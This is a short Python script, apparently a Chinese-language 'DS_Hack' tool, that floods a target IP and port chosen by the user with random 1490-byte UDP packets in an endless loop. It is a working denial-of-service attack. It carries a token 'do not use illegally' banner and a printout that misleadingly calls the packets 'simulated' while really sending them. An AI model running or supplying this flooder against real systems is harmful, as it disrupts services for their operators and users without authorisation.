import time
import socket
import os
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1490)  # 修正变量名和导入random模块

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_user_input():
    clear_screen()
    print(" -----------------[请勿用于违法用途]----------------- ")
    print("------------------{DS_Hack}--------------------------")
    print(" ")
    ip = input("请输入目标 IP 地址: ")
    port = int(input("攻击端口: "))
    speed = int(input("攻击速度 (1-1000, 数字越大速度越快): "))
    return ip, port, speed

def main():
    ip, port, speed = get_user_input()
    
    try:
        sent = 0
        while True:
            sock.sendto(data, (ip, port))  # 修正变量名
            sent += 1
            print(f"已模拟发送 {sent} 个数据包到 {ip}:{port}")
            # 调整延迟计算，使其更平滑，并且使用正确的变量名
            time.sleep((1000-speed)/2000)
    except KeyboardInterrupt:
        print("\n quit!!!。")
    finally:
        sock.close()  # 关闭套接字以释放资源

if __name__ == "__main__":
    main()
